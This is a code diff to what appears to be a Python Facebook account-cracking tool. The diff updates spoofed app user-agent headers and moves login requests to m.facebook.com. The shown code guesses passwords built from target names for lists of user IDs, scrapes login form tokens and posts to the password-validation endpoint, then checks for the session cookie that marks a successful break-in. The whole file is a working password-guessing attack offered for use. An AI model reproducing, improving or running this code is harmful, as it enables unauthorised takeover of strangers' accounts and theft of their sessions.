@@ -28,9 +28,10 @@ ani=('Fariya')
 love=('mbasic')
 ugen=[]
 ugen=[]
-header_grup =  'Davik/2.1.0 (Linux; Android 13; TECNO CK6 Build/TP1A.220624.014; wv) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/291009976;FBCR/;FBMF/Tecno;FBBD/Redmi;FBDV/23049RAD8C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]' 
-header_grup =  'Davik/2.1.0 (Linux; Android 10; CLT-L29 Build/HUAWEICLT-L29; wv) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Huawei;FBBD/Samsung;FBDV/M2012K11C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
-header_grup =  'Davik/2.1.0 (Linux; Android 10; SM-A715F Build/QP1A.190711.020; wv) [FBAN/MessengerLite;FBAV/429.0.0.27.114;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/444811002;FBCR/;FBMF/Samsung;FBBD/Xiaomi;FBDV/M2012K11C;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]'
+header_grup =  '[FBAN/Orca-Android;FBAV/396.1.0.28.104;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/429650999;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
+header_grup =  '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/INFINIX MOBILE LIMITED;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/INFINIX X676C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+header_grup =  '[FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/445612523;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/445612523;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+header_grup =  '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/INFINIX MOBILE LIMITED;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/INFINIX X676C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
 for xd in range(10000):
         aa='Mozilla/5.0 (Linux; Android 10; SM-A505F Build/QP1A.190711.020; wv)'
         b=random.choice(['6','7','8','9','10','11','12',])
@@ -224,10 +225,10 @@ def m1(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en;q=0.9'}
+                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SH4N7O=session.cookies.get_dict().keys()
                         if "c_user" in SH4N7O:
                                 coki=session.cookies.get_dict()
